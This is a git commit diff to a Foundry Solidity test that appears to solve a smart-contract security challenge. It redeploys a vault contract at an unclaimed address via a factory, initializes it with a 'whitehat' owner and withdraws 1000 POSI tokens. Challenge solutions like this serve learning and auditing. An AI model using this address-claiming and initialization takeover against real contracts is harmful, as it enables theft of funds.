477f5869296ad35af9a35e1950300c92f6d866a4
Adarsh-1806 <adarshmoradiya001@gmail.com>
2023-07-21 16:12:03 +0530

    solved challenge 4

--- test/Challenge4.t.sol
+++ test/Challenge4.t.sol
@@ -46,11 +46,21 @@ contract Challenge4Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge4Test -vvvv //
         ////////////////////////////////////////////////////*/
+        
+        //we have to deploy one contract with address : 0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F (vault contract address on another chain)
+        // eoa: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f (who has deployed above contract)
+        bytes memory code = type(VaultWalletTemplate).creationCode;
+        address _newVault = FACTORY.deploy(code, uint256(11));
+        assertEq(_newVault, unclaimedAddress,"address doesn't match");
 
 
-
-
+        (bool res,) = _newVault.call(abi.encodeWithSignature("initialize(address)", whitehat));
+        require(res,"Initialize failed");
+        (bool ret,) = _newVault.call(abi.encodeWithSignature("withdrawERC20(address,uint256,address)", address(POSI),1000 ether, devs));
+        require(ret,"withdreawERC20 failed");
+        
         //==================================================//
+
         vm.stopPrank();
 
         assertEq(POSI.balanceOf(devs), 1000 ether, "devs' POSI balance should be 1000 POSI");
